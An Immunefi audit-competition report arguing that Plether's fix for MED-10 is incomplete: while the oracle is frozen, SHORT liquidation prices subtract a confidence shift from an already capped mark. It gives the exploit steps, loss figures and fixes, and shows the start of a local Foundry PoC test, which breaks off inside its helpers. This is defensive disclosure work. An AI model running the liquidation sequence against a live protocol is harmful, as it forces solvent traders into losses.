# \#99616 [SC-Medium] Incomplete fix of audit finding MED-10 in `PletherOracle`: frozen-regime liquidation still subtracts the confidence shift from the already capped mark, so keepers can liquidate SHORT positions that are solvent at the policy price

**Submitted on Nov 14th 2026 at 14:19:37 UTC by @IronsideSec for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99616
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


## Brief/Intro

The Cecuro audit finding MED-10 ("Liquidator can liquidate short traders at prices below the configured cap-adjusted mark") is marked Addressed: liquidation pricing is supposed to apply the adverse confidence shift to the raw, uncapped basket and only then clamp the result to `CAP_PRICE`. At the in-scope commit this holds only while the oracle is live. During every oracle-frozen window (each weekend, Friday 17:00 to Sunday 17:00 New York) `PletherOracle` replays the Engine's stored mark, which is already clamped to the cap, as the "raw" price, so `updateLiquidationPrice` and `updateLiquidationBatchPrice` once again return `CAP_PRICE - shift` for SHORT positions. If the basket is at or above the cap when the market freezes, any keeper can liquidate, with empty update data and no oracle fee, a SHORT that is solvent at the protocol's own policy price and that the same keeper could not liquidate a minute earlier. In the PoC a SHORT with 60,100 USDG of equity against a 60,000 USDG requirement is liquidated: the trader loses 2,490 USDG and the keeper collects 995 USDG. The same cap-then-shift arithmetic also remains on the order-execution path, where SHORT closes and LONG opens fill below the policy price.

## Vulnerability Details

### Affected in-scope asset and classification

- **Asset:** [`packages/perps/src/PletherOracle.sol`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol) at the in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It is covered by the fourth listed asset, "All other contracts, libraries, router contracts and interfaces in packages/perps/src, except the six view-only contracts listed as out of scope below" (target `packages/perps/src`). The wrong price is consumed by the Router's liquidation paths and `CfdEngine.liquidatePosition`, and by order execution.
- **Report class:** incomplete fix of a prior-audit finding. The competition's scope page states that for findings marked fixed or acknowledged in the listed reports, a report on the same root cause is valid if it shows that the fix at commit `a82d4fef…` "is incomplete or introduces a new bug". MED-10 is such a finding.
- **Selected severity and impact:** **Medium — "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)".** This is the closest listed Medium impact and it is the severity the prior audit assigned to the same root cause. To be precise about the fit: the liquidating keeper does collect the ordinary liquidation bounty, so a profit motive exists. I am deliberately not selecting a higher impact, because the amount per event is bounded (liquidation charge plus the shift, about 0.125% of notional) and the trigger is an extreme market state.

This is not a claim about the cap itself (the immutable `CAP_PRICE` is the acknowledged pre-audit item SC-M6), about oracle clock alignment (HIGH-1), or about keeper tick selection (MED-7). It is only about the order in which the confidence shift and the cap are applied.

### What the fix was supposed to guarantee

The project's disposition of MED-10 in the Cecuro report (pp. 29-30 of [`audits/plether-ai-audit-report-2026-10-26.pdf`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)) reads:

> MED-10 — Addressed. Single-account and batch liquidation pricing now apply the directional confidence adjustment to the raw, uncapped basket, then clamp the resulting liquidation price to CAP. The neutral Engine mark remains capped separately. This removes the artificial below-cap SHORT liquidation price caused by subtracting confidence from an already capped mark. Confidence adjustments remain part of liquidation pricing; the fix changes their ordering, not the policy of using adverse prices.

The NatSpec of [`updateLiquidationPrice`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L324-L328) states the same rule and names both sources: it "Resolves a current basket **or frozen Engine mark** … shifts the price … downward for a SHORT position by the configured fraction of aggregate confidence, **then caps it at `CAP_PRICE`**." (emphasis added)

So the policy price for a SHORT liquidation is:

```text
policyPrice = min(rawBasket - shift, CAP_PRICE)        shift = confidence * adverseConfidenceMultiplierBps / 10_000
```

When the raw basket is at or above `CAP_PRICE + shift`, the policy price is exactly `CAP_PRICE`.

### Root cause: in the frozen regime the "raw" price is the already capped mark

The fix introduced [`_updateLiquidationSnapshot`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L531-L543), which hands the pre-cap basket price to the shift:

```solidity
/// @dev Retains the pre-cap price for adverse liquidation shifts while keeping the neutral snapshot capped.
function _updateLiquidationSnapshot(
    bytes[] calldata pythUpdateData
) internal returns (PriceSnapshot memory snapshot, uint256 rawPrice, uint256 confidence) {
    ...
    BasketPrice memory basket = _resolveCurrentBasket(pythUpdateData, PriceMode.Liquidation, policy);
    snapshot = _snapshotFromBasket(basket, policy, true);
    rawPrice = basket.price;
    confidence = basket.confidence;
}
```

But when the oracle is frozen, [`_resolveCurrentBasket`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L749-L756) never builds a basket; it returns [`_frozenBasket`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743):

```solidity
if (policy.oracleFrozen) {
    return _frozenBasket(mode, policy.maxStaleness);
}
```

```solidity
function _frozenBasket(PriceMode mode, uint256 maxStaleness) internal view returns (BasketPrice memory basket) {
    basket.price = engine.lastMarkPrice();
    basket.publishTime = engine.lastMarkTime();
    ...
    // Liquidations receive a deterministic, conservative confidence shift while Pyth is closed.
    basket.confidence = basket.price * basketMaxConfidenceRatioBps / 10_000;
}
```

`engine.lastMarkPrice()` is never above the cap: every writer clamps it, for example [`CfdEngine.updateMarkPrice`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1466-L1477) (`uint256 clamped = price > CAP_PRICE ? CAP_PRICE : price;`). Therefore, in the frozen regime, `rawPrice` in `_updateLiquidationSnapshot` is the capped mark, and both liquidation entrypoints compute "capped mark minus shift" again:

- [`updateLiquidationPrice`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L334-L344): `snapshot.price = _clampToCap(_adverseLiquidationPrice(account, rawPrice, confidence));`
- [`updateLiquidationBatchPrice`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L308-L322): `shortPrice: _clampToCap(_directionalLiquidationPriceFromShift(CfdTypes.Side.SHORT, rawPrice, shift))`
- [`_directionalLiquidationPriceFromShift`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L966-L972): `side == LONG ? price + shift : price > shift ? price - shift : 0`

With the mark at the cap this yields `CAP_PRICE - shift`, which is exactly the artifact MED-10 described and the disposition says was removed. These are the same two functions MED-10 listed.

The information needed to apply the rule is on-chain during the freeze: the last accepted live basket is stored before clamping ([`_acceptedBasket = basket;`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L795-L799)), and only its clamped value is ever read back.

The shift magnitude is not what differs between the regimes. In the PoC the last live tick carries the maximum admissible confidence (10 bps of price), so the live shift and the frozen "policy-derived" shift are both `50,000`. The only difference is the base: `200,100,000` (raw) while live, `200,000,000` (capped mark) while frozen.

### Second manifestation: order execution shifts the clamped snapshot price

Order execution was not changed by the fix. Both the single and the batch path clamp first and shift afterwards ([`#L283-L284`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L283-L284), [`#L557-L558`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L557-L558), with the clamp at [`#L887`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L878-L888)):

```solidity
snapshot = _snapshotFromBasket(basket, policy, false);   // snapshot.price = _clampToCap(basket.price)
snapshot.price = _orderExecutionPrice(request, snapshot.price, basket.confidence, policy.oracleFrozen);
```

[`_orderExecutionPrice`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L905-L941) ends with `return _clampToCap(_adverseOrderPrice(request, price, confidence));`. An upward shift from the cap is clamped back to the cap, a downward shift is not, so the two downward-adverse sides (SHORT close, LONG open) receive `CAP_PRICE - shift` although `min(raw - shift, CAP_PRICE)` equals `CAP_PRICE`. I include this for completeness and flag honestly that the NatSpec of that entrypoint ([`#L208-L210`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L204-L215)) says the base basket "is capped and then shifted", so the project may regard the order-path half as documented. The frozen-liquidation half is the core of this report.

### Worked numbers at release parameters

`CAP_PRICE = 200,000,000`, `basketMaxConfidenceRatioBps = 10`, `adverseConfidenceMultiplierBps = 2,500` ([DEPLOYMENT.md, "Initial release parameters"](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L124-L150)). Take a raw basket of `200,100,000` (2.0010) with aggregate confidence `200,000` (accepted: `200,000 * 10,000 <= 200,100,000 * 10`). Then `shift = 200,000 * 2,500 / 10,000 = 50,000`.

| Path | Computation | SHORT-adverse price |
|---|---|---|
| Policy (fix note, NatSpec) | `min(200,100,000 - 50,000, 200,000,000)` | `200,000,000` |
| Live liquidation (fixed) | raw shifted, then clamped | `200,000,000` |
| Frozen liquidation, single and batch | stored mark `200,000,000 - 50,000` | **`199,950,000`** |
| Order execution: SHORT close, LONG open | clamped `200,000,000 - 50,000` | **`199,950,000`** |
| Order execution: SHORT open, LONG close | clamped `200,000,000 + 50,000`, re-clamped | `200,000,000` |

### Exact sequence (frozen-regime liquidation)

All calls are permissionless. Times are those used in the PoC.

1. A trader holds a SHORT of 10,000 lots (about 2,000,000 USDG notional at the cap). The basket rises above the cap and anyone refreshes the mark; the Engine stores the capped mark `200,000,000`.
2. Friday 16:45 New York (FAD window, oracle still live, 3% margin requirement): the trader's equity at the cap is 60,100 USDG against a 60,000 USDG requirement. A keeper calls `executeLiquidation(account, liveTick)`; the live path prices the SHORT at `min(raw - shift, CAP_PRICE) = CAP_PRICE` and the call reverts with `CfdEngine__PositionIsSolvent`.
3. Friday 17:00 New York: the calendar freezes the oracle. The position, the stored mark and the last accepted basket are unchanged.
4. Any keeper calls `executeLiquidation(account, [])` (or `executeLiquidationBatch`) with empty update data and no oracle fee. The frozen SHORT price is `199,950,000`. At that price equity is 59,600 USDG against a 59,985 USDG requirement, and the account is liquidated.
5. Outcome measured in the PoC: the trader's account value falls by 2,490 USDG (the 1,990 USDG liquidation charge, split 995 USDG to the keeper and 995 USDG to LPs, plus 500 USDG of SHORT profit not paid because settlement happens at `CAP_PRICE - shift`). The keeper's balance rises by 995 USDG.

The window stays open for the whole frozen period. A SHORT is affected whenever its equity at the cap is below `requirement(CAP) + 0.97 * lots * shift`, i.e. within about 2.4 bps of notional above the 3% requirement (485 USDG for this position).

### Preconditions and limits

- The basket must be at or above `CAP_PRICE` (2.00) when the market freezes, so that the stored mark is the cap. This is an extreme market state. The scope page says "Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it"; I state the precondition plainly and do not claim it is likely.
- Only SHORT positions close to the frozen/FAD requirement are affected, in the band given above. LONG liquidations are not affected (the upward shift is clamped back to the cap). Frozen voluntary closes are not affected (they are unshifted by design). The live liquidation path is fixed.
- Per event the loss is bounded: the liquidation charge (10 bps of notional, capped by the position's liquidation reserve) plus `lots * shift` (at most 2.5 bps of notional). On the order path the loss is at most `lots * shift` per fill.
- No attacker capital is required, and during the freeze the keeper needs no Pyth payload.
- I do not claim loss of LP funds, protocol insolvency, or any freezing of funds.

### Known-issue boundary

- **Cecuro MED-10** is the same root cause. Its disposition is "Addressed", and its fix landed in [`eadc5c58`](https://github.com/immunefi-team/audit-comp-plether/commit/eadc5c587e2f2f1ec26c51132472ab876d6edc15) (PR #124). This report shows the fix is incomplete at the in-scope commit: in the frozen regime the two functions MED-10 named still subtract the shift from an already capped mark.
- **The fix's own tests cover live baskets only.** [`test_Liquidation_SingleShiftsRawBasketBeforeCap`, `test_Liquidation_BatchShiftsRawBasketBeforeCap` and `test_Liquidation_ShortStaysCappedWhenShiftLeavesRawPriceAboveCap`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/oracle/PletherOracle.t.sol#L649-L688) assert the rule with live prices above the cap. The fuzz test [`testFuzz_Liquidation_SingleAndBatchMatchRawBasketPolicy`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/oracle/PletherOracle.t.sol#L690-L737) has a frozen branch, but it pins the installed mark at `100,000,000` (1.00), so the capped case is never exercised. That branch models the frozen base as "the installed mark with policy-derived confidence"; I mention it because the project may point to it. It shows that a shift is applied in the frozen regime, which is not disputed here. It does not show that the shift is meant to go below an already capped mark, which is what the MED-10 disposition says was removed.
- **Documentation.** The whitepaper says frozen liquidations "apply a conservative confidence shift synthesized from the configured maximum basket confidence ratio" ([WHITEPAPER.md](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1071-L1077)) and that the side-adverse price is capped at C ([same file](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1029-L1031)). Neither statement, nor anything in the `SECURITY.md` sections listed as known limitations, says that a frozen SHORT liquidation is priced below the cap when the basket is above it.
- **SC Audit Studio SC-M6** (immutable `CAP_PRICE`, acknowledged) concerns the existence and immutability of the cap. MED-10 was raised and accepted separately from it.

### Recommended remediation

1. **Frozen liquidation.** Keep the pre-cap value of the basket that produced the stored mark and use it as the shift base for liquidation while the oracle is frozen. The oracle already stores the pre-cap accepted basket; `_frozenBasket` in `PriceMode.Liquidation` can use `_acceptedBasket.price` when `_acceptedBasket.publishTime == engine.lastMarkTime()`. As a minimal alternative, when the stored mark equals `CAP_PRICE` and no pre-cap value is available, do not apply the downward SHORT shift.
2. **Order execution.** Pass the pre-cap `basket.price` into `_orderExecutionPrice` and clamp once after the shift, keeping `markPrice` capped, or state explicitly in the specification that order execution is intentionally capped before shifting.
3. **Regression tests.** Extend the frozen branch of the liquidation fuzz test to marks at the cap, and add order-quote tests with a raw basket above the cap.

## Impact Details

Selected impact: **Medium — "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)"**, with the fit explained under "Affected in-scope asset and classification".

Frozen-regime liquidation of a SHORT that is solvent at the policy price:

- The trader is force-closed although the account satisfies the margin requirement at the protocol's stated liquidation price. In the PoC the trader's account value drops by **2,490 USDG** on a position of about 2,000,000 USDG notional: 1,990 USDG liquidation charge and 500 USDG of profit that is not paid.
- The liquidating keeper gains **995 USDG**; LPs gain the other 995 USDG of the charge and retain the 500 USDG of unpaid profit. The loss is permanent for the trader.
- The loss scales linearly with position size: about 12.5 bps of notional per wrongly liquidated position (10 bps charge plus 2.5 bps shift).
- The condition persists for the entire frozen window (about 48 hours on an ordinary weekend) and can be used by any account acting as keeper without capital or oracle fees.

Order execution while the basket is above the cap:

- A SHORT close of 10,000 lots realizes 9,500 USDG instead of 10,000 USDG (500 USDG, 2.5 bps of notional, kept by the pool).
- A LONG open of the same size is filled 500 USDG below the neutral mark it is immediately valued at.
- A SHORT limit close with its target at the cap is terminally rejected as `Slippage`, although the policy price equals the target.

Limits: the basket has to be at or above the 2.00 cap, which is an extreme price for the index, and only positions inside the narrow equity band are flipped into liquidation. I do not claim that this is likely under normal conditions, and I do not claim theft from LPs or insolvency.

## References

- In-scope repository and commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- `_updateLiquidationSnapshot` (pre-cap price retained for the shift): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L531-L543
- Frozen routing in `_resolveCurrentBasket`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L749-L756
- `_frozenBasket` (stored Engine mark used as the basket price): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L729-L743
- `updateLiquidationBatchPrice`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L308-L322
- `updateLiquidationPrice` and its NatSpec ("then caps it at `CAP_PRICE`"): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L324-L344
- Liquidation shift helpers: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L943-L972
- Pre-cap accepted basket stored by the oracle: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L795-L799
- Order-execution call sites: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L283-L284 and https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L557-L558
- Clamp inside `_snapshotFromBasket`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L878-L888
- Order shift helpers: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L905-L941
- Order-path NatSpec ("capped and then shifted"): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L204-L215
- Engine mark is always clamped: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L1466-L1477
- Fix tests (live cases and the fuzz test's frozen branch): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/oracle/PletherOracle.t.sol#L649-L737
- Release parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L124-L150
- Whitepaper, frozen liquidation shift: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1071-L1077
- Cecuro AI audit report, MED-10 (pp. 29-30): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
- Fix commit for MED-10 in the competition repository (PR #124): https://github.com/immunefi-team/audit-comp-plether/commit/eadc5c587e2f2f1ec26c51132472ab876d6edc15
- Fix commit cited in the MED-10 disposition: https://github.com/Plether-Fi/plether-core/commit/006c818d364282943e2063eab52ab0c89181304c


## Proof of Concept

 

## Proof of Concept

### What the tests prove

The PoC is one Foundry test file added to the repository's own test suite. It runs locally against the unmodified in-scope contracts at commit `a82d4fef`; only Pyth and the settlement token are mocks (the repository's own `MockPyth` and mock settlement token). It makes no network call and sends no transaction to any public chain.

It contains five tests:

1. **`test_A_FrozenLiquidation_ShortSolventAtCapIsLiquidated` (main result).** A SHORT of 10,000 lots is opened in a live market, the basket rises above the cap and the capped mark is installed. In the Friday FAD window the trader holds 60,100 USDG equity against the 60,000 USDG requirement. Control: a live `executeLiquidation` reverts with `CfdEngine__PositionIsSolvent`. After the 17:00 New York freeze, with nothing else changed, the lens reports the account as not liquidatable at `CAP_PRICE` and liquidatable at `CAP_PRICE - shift`; the frozen single and batch quotes are both `199,950,000`; `executeLiquidation(account, [])` succeeds. The test asserts the trader's loss equals the full liquidation charge plus `lots * shift` and that the keeper's balance increased.
2. **`test_B_SameTick_LiveLiquidationQuoteIsFixed_OrderQuotesAreNot` (control on one tick).** For the same signed tick above the cap, the fixed live liquidation quote for a SHORT is `CAP_PRICE`, while the order quotes for a SHORT close (single, batch, batch-cache reuse) and a LONG open are `CAP_PRICE - shift`; the upward-adverse sides are clamped back to the cap.
3. **`test_C_OrderPath_ShortCloseAboveCap_FillsAtCapMinusShift`.** End to end through the Router: the close realizes 9,500 USDG instead of 10,000 USDG.
4. **`test_D_OrderPath_LongOpenAboveCap_EntersAtCapMinusShift`.** End to end: the LONG's entry basis is `lots * (CAP_PRICE - shift)` while the neutral mark stays at the cap.
5. **`test_E_OrderPath_ShortLimitCloseAtCap_RejectedAsSlippage`.** A limit close targeting the cap ends `Failed` with reason `Slippage`.

### Test file

Save the complete block below as `packages/perps/test/audit/Med10FixIncompleteFrozenCap.t.sol`.

PoC SHA-256: `aae52e606942df3c8005dff859448c296a77d770350ab4df3a17674927a730b1`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice PoC: the fix for Cecuro MED-10 ("Liquidator can liquidate short traders at prices below the configured
///         cap-adjusted mark") is incomplete at commit a82d4fef.
///         The fix shifts the RAW (pre-cap) basket and clamps afterwards, but only when the basket is live:
///           (1) in the oracle-frozen regime `_frozenBasket` replays the CAP-clamped Engine mark as the "raw"
///               price, so `updateLiquidationPrice` / `updateLiquidationBatchPrice` return CAP - shift again and
///               a SHORT that is solvent at the policy price is liquidated;
///           (2) order execution (`_orderExecutionPrice(request, snapshot.price, ...)`, single and batch) shifts
///               the already clamped snapshot price, so SHORT closes and LONG opens fill at CAP - shift.
///         Runs on the repository's own harness (`BasePerpTest`) with the release risk parameters, release Senior
///         limits and release oracle/router policy (DEPLOYMENT.md "Initial release parameters"). Only Pyth and the
///         settlement token are mocks (the repository's `MockPyth` / mock settlement token).
contract Med10FixIncompleteFrozenCapTest is BasePerpTest {

    // Release values that differ from BasePerpTest.
    uint256 internal constant RELEASE_ADVERSE_MULTIPLIER_BPS = 2500;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;

    // Basket above CAP: raw 2.0010 with aggregate confidence 0.0020 (exactly the 10 bps release ratio ceiling is
    // 0.002001, so this tick is accepted). shift = 200_000 * 2500 / 10_000 = 50_000.
    uint256 internal constant RAW_ABOVE_CAP = 200_100_000;
    uint64 internal constant CONF_ABOVE_CAP = 200_000;
    uint256 internal constant SHIFT = 50_000;
    uint256 internal constant ENTRY_PRICE = 199_000_000;

    uint256 internal constant LOTS = 10_000;
    uint256 internal constant SIZE = LOTS * 1e20; // 10,000 lots of 100 tokens (~$2M notional at 2.0)

    // Fri 2024-03-08 21:45:00 UTC (16:45 EST) is FAD-live; 22:00:30 UTC (17:00:30 EST) is oracle-frozen.
    uint256 internal constant FRIDAY_FAD_LIVE = 1_709_934_300;
    uint256 internal constant FRIDAY_FROZEN = 1_709_935_230;
    // Thu 2024-03-07 12:00:00 UTC: ordinary live market.
    uint256 internal constant THURSDAY_LIVE = 1_709_812_800;

    address internal shortTrader = address(0x5110);
    address internal longTrader = address(0x1011);
    address internal keeper = address(0xBEEF);

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 10_000_000e6;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();

        // Release Senior limits (40M / 80%) and release Router/Oracle policy, both through their 72h timelocks.
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = RELEASE_MAX_SENIOR_EXPOSURE;
        poolConfig.maxSeniorShareBps = RELEASE_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(poolConfig);

        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = RELEASE_ADVERSE_MULTIPLIER_BPS;
        routerConfig.minOpenNotionalAssets = 1000e6;
        routerConfig.maxPendingOrders = 5;
        routerConfig.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(routerConfig);

        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();

        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release confidence ratio");
        assertEq(pool.maxSeniorExposureAssets(), RELEASE_MAX_SENIOR_EXPOSURE, "release senior exposure");
        assertEq(pool.maxSeniorShareBps(), RELEASE_MAX_SENIOR_SHARE_BPS, "release senior share");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.CAP_PRICE(), CAP_PRICE, "release cap");
        assertLt(vm.getBlockTimestamp(), THURSDAY_LIVE, "timeline starts before Thursday noon");

        _fundTrader(shortTrader, 300_000e6);
        _fundTrader(longTrader, 300_000e6);
    }

    // ---------------------------------------------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------------------------------------------

    function _payload(
        uint256 price,
        uint64 conf,
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal pure returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](2);
        updates[0] = MockPyth.FeedUpdate({
            id: BASE_PYTH_FEED_A,
            price: MockPyth.MockPrice({
                price: int64(uint64(price)),
                conf: conf,
                expo: -8,
                publishTime: publishTime,
                prevPublishTime: prevPublishTime
            })
        });
        updates[1] = MockPyth.FeedUpdate({
            id: BASE_PYTH_FEED_B,
            price: MockPyth.MockPrice({
                price: int64(uint64(price)),
                conf: conf,
                expo: -8,
                publishTime: publishTime,
                prevPublishTime: prevPublishTime
            })
        });
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    /// @dev Public, permissionless Router mark refresh with a signed (mock) live tick published now.
    function _refreshMark(
        uint256 price,
        uint64 conf
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        uint256 nowTs = vm.getBlockTimestamp();
        router.updateMarkPrice(_payload(price, conf, nowTs, nowTs - 1));
    }

    /// @dev Public commit by `trader`, then public execution in a later block with the first post-commit tick.
    function _commitAndExecute(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price,
        uint64 conf
    ) internal returns (uint64 orderId, Vm.Log[] memory logs) {
        vm.prank(trader);
        orderId = router.commitOrder(side, size, margin, 0, isClose);
        uint256 commitTime = vm.getBlockTimestamp();
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(commitTime + 2);
        vm.recordLogs();
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(orderId, _payload(price, conf, commitTime + 1, commitTime));
        logs = vm.getRecordedLogs();
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _engineEventPrice(
        Vm.Log[] memory logs,
        bytes32 topic0,
        address account
    ) internal view returns (uint256 price, int256 pnl, bool found) {
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].emitter == address(engine) && logs[i].topics.length == 2 && logs[i].topics[0] == topic0
                    && address(uint160(uint256(logs[i].topics[1]))) == account
            ) {
                if (topic0 == ICfdEngineTypes.PositionClosed.selector) {
                    (,, price, pnl) = abi.decode(logs[i].data, (CfdTypes.Side, uint256, uint256, int256));
                } else if (topic0 == ICfdEngineTypes.PositionOpened.selector) {
                    (,, price,) = abi.decode(logs[i].data, (CfdTypes.Side, uint256, uint256, uint256));
                } else {
                    (,, price,) = abi.decode(logs[i].data, (CfdTypes.Side, uint256, uint256, uint256));
                }
                found = true;
                return (price, pnl, found);
            }
        }
    }

